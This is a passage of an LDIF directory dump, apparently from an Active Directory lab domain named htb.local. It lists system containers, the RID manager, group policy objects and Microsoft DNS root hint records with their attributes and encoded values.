isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# RpcServices, System, htb.local
dn: CN=RpcServices,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
objectClass: rpcContainer
cn: RpcServices
distinguishedName: CN=RpcServices,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225114.0Z
uSNCreated: 5892
uSNChanged: 94388
showInAdvancedViewOnly: TRUE
name: RpcServices
objectGUID:: ge44S8z010qo9CmGSaYViw==
systemFlags: -1946157056
objectCategory: CN=Rpc-Container,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# FileLinks, System, htb.local
dn: CN=FileLinks,CN=System,DC=htb,DC=local
objectClass: top
objectClass: fileLinkTracking
cn: FileLinks
distinguishedName: CN=FileLinks,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225114.0Z
uSNCreated: 5893
uSNChanged: 94391
showInAdvancedViewOnly: TRUE
name: FileLinks
objectGUID:: FzII/fWsMU+5KjqzRgKSIg==
systemFlags: -1946157056
objectCategory: CN=File-Link-Tracking,CN=Schema,CN=Configuration,DC=htb,DC=loc
 al
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# VolumeTable, FileLinks, System, htb.local
dn: CN=VolumeTable,CN=FileLinks,CN=System,DC=htb,DC=local

# ObjectMoveTable, FileLinks, System, htb.local
dn: CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=htb,DC=local
objectClass: top
objectClass: fileLinkTracking
objectClass: linkTrackObjectMoveTable
cn: ObjectMoveTable
distinguishedName: CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225114.0Z
uSNCreated: 5895
uSNChanged: 94397
showInAdvancedViewOnly: TRUE
name: ObjectMoveTable
objectGUID:: H83I4+x/OkiHyA6N6kDmig==
systemFlags: -1946157056
objectCategory: CN=Link-Track-Object-Move-Table,CN=Schema,CN=Configuration,DC=
 htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# Default Domain Policy, System, htb.local
dn: CN=Default Domain Policy,CN=System,DC=htb,DC=local
objectClass: top
objectClass: leaf
objectClass: domainPolicy
cn: Default Domain Policy
distinguishedName: CN=Default Domain Policy,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225114.0Z
uSNCreated: 5896
uSNChanged: 94400
showInAdvancedViewOnly: TRUE
name: Default Domain Policy
objectGUID:: gIiLMiI6F0OVQ3xN/aM1nA==
objectCategory: CN=Domain-Policy,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# AppCategories, Default Domain Policy, System, htb.local
dn: CN=AppCategories,CN=Default Domain Policy,CN=System,DC=htb,DC=local
objectClass: top
objectClass: classStore
cn: AppCategories
distinguishedName: CN=AppCategories,CN=Default Domain Policy,CN=System,DC=htb,
 DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225114.0Z
uSNCreated: 5897
uSNChanged: 94403
showInAdvancedViewOnly: TRUE
name: AppCategories
objectGUID:: 6mgqOIOJ2E6AzqKV58bToQ==
objectCategory: CN=Class-Store,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# RID Manager$, System, htb.local
dn: CN=RID Manager$,CN=System,DC=htb,DC=local
objectClass: top
objectClass: rIDManager
cn: RID Manager$
distinguishedName: CN=RID Manager$,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105333.0Z
whenChanged: 20201229123324.0Z
uSNCreated: 12467
uSNChanged: 278570
showInAdvancedViewOnly: TRUE
name: RID Manager$
objectGUID:: IJM8iAY7k0SyoNISW5B03g==
fSMORoleOwner: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Nam
 e,CN=Sites,CN=Configuration,DC=htb,DC=local
rIDAvailablePool: 4611686014132429208
systemFlags: -1946157056
objectCategory: CN=RID-Manager,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# Meetings, System, htb.local
dn: CN=Meetings,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: Meetings
distinguishedName: CN=Meetings,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225114.0Z
uSNCreated: 5898
uSNChanged: 94409
showInAdvancedViewOnly: TRUE
name: Meetings
objectGUID:: /xaE5SIj4k2oF23Um9unvA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# Policies, System, htb.local
dn: CN=Policies,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: Policies
distinguishedName: CN=Policies,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225114.0Z
uSNCreated: 5899
uSNChanged: 94412
showInAdvancedViewOnly: TRUE
name: Policies
objectGUID:: 6bEL86VxhE+Xx+4O+mCoJg==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# {31B2F340-016D-11D2-945F-00C04FB984F9}, Policies, System, htb.local
dn: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=htb,DC=
 local

# {6AC1786C-016F-11D2-945F-00C04fB984F9}, Policies, System, htb.local
dn: CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=htb,DC=
 local

# MicrosoftDNS, System, htb.local
dn: CN=MicrosoftDNS,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: MicrosoftDNS
distinguishedName: CN=MicrosoftDNS,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
displayName: DNS Servers
uSNCreated: 12491
uSNChanged: 12496
showInAdvancedViewOnly: TRUE
name: MicrosoftDNS
objectGUID:: BA1d8sILIkCv0A3aXAe6kA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,DC=local
objectClass: top
objectClass: dnsZone
cn: Zone
distinguishedName: DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12497
uSNChanged: 12499
showInAdvancedViewOnly: TRUE
name: RootDNSServers
objectGUID:: 8206v4RoxkiCvf2owf2iNA==
objectCategory: CN=Dns-Zone,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dc: RootDNSServers

# @, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,DC=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,DC=
 local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12500
uSNChanged: 12500
showInAdvancedViewOnly: TRUE
name: @
objectGUID:: gfvT8Ra4S0en6Ae+9GW80g==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBTQxST09ULVNFUlZFUlMDTkVUAA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBTAxST09ULVNFUlZFUlMDTkVUAA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBSwxST09ULVNFUlZFUlMDTkVUAA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBSgxST09ULVNFUlZFUlMDTkVUAA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBSQxST09ULVNFUlZFUlMDTkVUAA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBSAxST09ULVNFUlZFUlMDTkVUAA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBRwxST09ULVNFUlZFUlMDTkVUAA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBRgxST09ULVNFUlZFUlMDTkVUAA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBRQxST09ULVNFUlZFUlMDTkVUAA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBRAxST09ULVNFUlZFUlMDTkVUAA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBQwxST09ULVNFUlZFUlMDTkVUAA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBQgxST09ULVNFUlZFUlMDTkVUAA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBQQxST09ULVNFUlZFUlMDTkVUAA==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dc: @

# A.ROOT-SERVERS.NET, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=A.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=A.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12501
uSNChanged: 12502
showInAdvancedViewOnly: TRUE
name: A.ROOT-SERVERS.NET
objectGUID:: dtoplRRHFUasO/c7REv/EQ==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFA7o+AAAAAAAAAAIAMA==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: A.ROOT-SERVERS.NET

# B.ROOT-SERVERS.NET, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=B.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=B.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12503
uSNChanged: 12504
showInAdvancedViewOnly: TRUE
name: B.ROOT-SERVERS.NET
objectGUID:: srVkHaaXtkWrx8WUs/m7JQ==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAACEAAAAAAAAAAAACw==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: B.ROOT-SERVERS.NET

# C.ROOT-SERVERS.NET, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=C.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=C.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12505
uSNChanged: 12506
showInAdvancedViewOnly: TRUE
name: C.ROOT-SERVERS.NET
objectGUID:: BM46ltBMekOFQnpwPSHOhg==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAACAAAAAAAAAAAADA==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: C.ROOT-SERVERS.NET

# D.ROOT-SERVERS.NET, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=D.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=D.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12507
uSNChanged: 12508
showInAdvancedViewOnly: TRUE
name: D.ROOT-SERVERS.NET
objectGUID:: +vJAIx9lnU603Zxlj2ncHQ==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAAtAAAAAAAAAAAADQ==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: D.ROOT-SERVERS.NET

# E.ROOT-SERVERS.NET, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=E.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=E.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12509
uSNChanged: 12509
showInAdvancedViewOnly: TRUE
name: E.ROOT-SERVERS.NET
objectGUID:: /wWmSs7xhkCguvszjOVqVg==
dnsRecord:: BAABAAUIAAAAAAAAAAAAAAAAAAAAAAAAwMvmCg==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dc: E.ROOT-SERVERS.NET

# F.ROOT-SERVERS.NET, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=F.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=F.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12510
uSNChanged: 12511
showInAdvancedViewOnly: TRUE
name: F.ROOT-SERVERS.NET
objectGUID:: r2+gTlFnpkSdjdUiGhcQ6g==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAAvAAAAAAAAAAAADw==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: F.ROOT-SERVERS.NET

# G.ROOT-SERVERS.NET, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=G.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=G.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12512
uSNChanged: 12512
showInAdvancedViewOnly: TRUE
name: G.ROOT-SERVERS.NET
objectGUID:: bNs6ytSa5ECqQwegO7VMfw==
dnsRecord:: BAABAAUIAAAAAAAAAAAAAAAAAAAAAAAAwHAkBA==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dc: G.ROOT-SERVERS.NET

# H.ROOT-SERVERS.NET, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=H.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=H.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12513
uSNChanged: 12514
showInAdvancedViewOnly: TRUE
name: H.ROOT-SERVERS.NET
objectGUID:: a5789ZlJnUiMbe9AtJfOtw==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAABAAAAAAAAAAAAUw==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: H.ROOT-SERVERS.NET

# I.ROOT-SERVERS.NET, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=I.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=I.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12515
uSNChanged: 12516
showInAdvancedViewOnly: TRUE
name: I.ROOT-SERVERS.NET
objectGUID:: Hw84ppqm/kOhdI3ka8kjyw==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEH/gAAAAAAAAAAAAAAUw==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: I.ROOT-SERVERS.NET

# J.ROOT-SERVERS.NET, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=J.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=J.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12517
uSNChanged: 12518
showInAdvancedViewOnly: TRUE
name: J.ROOT-SERVERS.NET
objectGUID:: OMEFpVySJ0i3Apq4ilg7sw==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAwwnAAAAAAAAAAIAMA==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: J.ROOT-SERVERS.NET

# K.ROOT-SERVERS.NET, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=K.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=K.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12519
uSNChanged: 12520
showInAdvancedViewOnly: TRUE
name: K.ROOT-SERVERS.NET
objectGUID:: JhCRIPOgrE657e5fq5qPGA==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEH/QAAAAAAAAAAAAAAAQ==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: K.ROOT-SERVERS.NET

# L.ROOT-SERVERS.NET, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=L.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=L.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12521
uSNChanged: 12522
showInAdvancedViewOnly: TRUE
name: L.ROOT-SERVERS.NET
objectGUID:: YSN5J6sPhEaVLBbCPRjcrA==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAACfAAAAAAAAAAAAQg==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: L.ROOT-SERVERS.NET

# M.ROOT-SERVERS.NET, RootDNSServers, MicrosoftDNS, System, htb.local
dn: DC=M.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: dnsNode
distinguishedName: DC=M.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105403.0Z
whenChanged: 20190918105403.0Z
uSNCreated: 12523
uSNChanged: 12524
showInAdvancedViewOnly: TRUE
name: M.ROOT-SERVERS.NET
objectGUID:: MygcV+LwAEe95Ueo9VqJnQ==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAENwwAAAAAAAAAAAAAANQ==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: M.ROOT-SERVERS.NET

# RAS and IAS Servers Access Check, System, htb.local
dn: CN=RAS and IAS Servers Access Check,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: RAS and IAS Servers Access Check
distinguishedName: CN=RAS and IAS Servers Access Check,CN=System,DC=htb,DC=loc
 al
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5906
uSNChanged: 5906
showInAdvancedViewOnly: TRUE
name: RAS and IAS Servers Access Check
objectGUID:: K4RL30LcCU+qTI9/mrhJQw==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# File Replication Service, System, htb.local
dn: CN=File Replication Service,CN=System,DC=htb,DC=local
objectClass: top
objectClass: applicationSettings
objectClass: nTFRSSettings
cn: File Replication Service
distinguishedName: CN=File Replication Service,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5907
uSNChanged: 94484
showInAdvancedViewOnly: TRUE
name: File Replication Service
objectGUID:: WpfMamYcH0iVihojPwiqvg==
systemFlags: -1946157056
objectCategory: CN=NTFRS-Settings,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# Dfs-Configuration, System, htb.local
dn: CN=Dfs-Configuration,CN=System,DC=htb,DC=local
objectClass: top
objectClass: dfsConfiguration
cn: Dfs-Configuration
distinguishedName: CN=Dfs-Configuration,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5908
uSNChanged: 94487
showInAdvancedViewOnly: FALSE
name: Dfs-Configuration
objectGUID:: YBK/zVODM06S/kOd7dUKsg==
objectCategory: CN=Dfs-Configuration,CN=Schema,CN=Configuration,DC=htb,DC=loca
 l
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# IP Security, System, htb.local
dn: CN=IP Security,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: IP Security
distinguishedName: CN=IP Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5909
uSNChanged: 94490
showInAdvancedViewOnly: TRUE
name: IP Security
objectGUID:: t9dhoivmcEeaix4XbUZ25Q==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecPolicy{72385230-70FA-11D1-864C-14A300000000}, IP Security, System, htb.l
 ocal
dn: CN=ipsecPolicy{72385230-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
 tem,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecPolicy
cn: ipsecPolicy{72385230-70FA-11D1-864C-14A300000000}
description: For all IP traffic, always request security using Kerberos trust.
